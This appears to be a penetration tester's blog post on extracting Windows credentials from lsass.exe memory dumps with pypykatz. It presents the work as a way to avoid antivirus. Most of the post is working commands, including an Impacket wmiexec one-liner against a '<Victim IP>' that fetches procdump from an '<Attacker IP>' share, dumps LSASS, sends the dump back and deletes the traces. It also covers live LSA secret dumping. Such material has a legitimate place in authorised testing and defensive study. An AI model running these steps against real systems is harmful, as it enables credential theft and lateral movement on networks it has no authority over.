---
published: true
comments: true
---
Update: [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) now includes the 'lsassy' module which automates the following steps. While the article below still works, if you need dump lsass across multiple hosts, I'd use CrackMapExec as the steps below take a lot more time.

I rarely use Mimikatz for more than parsing memory dumps of lsass.exe taken with procdump64.exe. I'm just not going to risk running Mimikatz from CrackMapExec or uploading Mimikatz to the client's environment when I can bypass antivirus by using wmiexec.py from Impacket to upload procdump64.exe, run the command to make a dump file from lsass.exe, and download it to be processed offline using Mimikatz on a system that I control. If this sounds like a lot of extra steps, it is. This post is about using a Python3 library to save yourself some work when processing those lsass.exe dump file to get credentials.

## About pypykatz

Mimikatz implementation in pure Python. -optimized for offline persing, but has options for live credential dumping as well. Runs on all OS's which support python>=3.6

## Installation

Via pip: 


    pip3 install pypykatz

Via Github:

```
pip3 install minidump minikerberos asn1crypto
git clone https://github.com/skelsec/pypykatz.git
cd pypykatz
python3 setup.py install
```

## Usage:

```
usage: pypykatz [-h] [-v] [--json] [-e] [-o OUTFILE] [-k KERBEROS_DIR]
                {minidump,live,rekall} ...

Pure Python implementation of Mimikatz --or at least some parts of it--

positional arguments:
  {minidump,live,rekall}
                        commands
    minidump            Get secrets from LSASS minidump file
    live                Get secrets from live machine
    rekall              Get secrets from memory dump

optional arguments:
  -h, --help            show this help message and exit
  -v, --verbose
  --json                Print credentials in JSON format
  -e, --halt-on-error   Stops parsing when a file cannot be parsed
  -o OUTFILE, --outfile OUTFILE
                        Save results to file (you can specify --json for json
                        file, or text format will be written)
  -k KERBEROS_DIR, --kerberos-dir KERBEROS_DIR
                        Save kerberos tickets to a directory.
```

## Examples:

Parsing minidump file of the LSASS process:

```
pypykatz minidump <minidump file>
```



Dumping LIVE system LSA secrets:

```
pypykatz live lsa
```

## Thoughts on using pypykatz vs. Mimikatz for parsing creds from lsass.exe memory dumps

Instead of running wmiexec with multiple commands to upload procdump, dump lsass.exe, download the dump file, and copy that over to a Windows host to use Mimikatz: 

Install pypykatz:

`pip3 install pypykatz`

Run Impacket smbserver.py:

`./smbserver.py -smb2support <share name> <path to dir where you have procdump64.exe>`

Run Impacket wmiexec.py:

`./wmiexec.py <domain>/<username>:<password>@<Victim IP> 'copy \\<Attacker IP>\<share>\procdump64.exe . & procdump64.exe -accepteula -64 -ma lsass.exe lsass.dmp & copy lsass.dmp \\<Attacker IP>\<share>\ & del lsass.dmp & del procdump64.exe'`

Dump creds from lsass.dmp:

`pypykatz minidump lsass.dmp`

Note: I've seen pypykatz error out on some editions of Windows 10. If this happens, you'll have to copy that lsass.dmp over to a Windows system under your control and use Mimikatz.
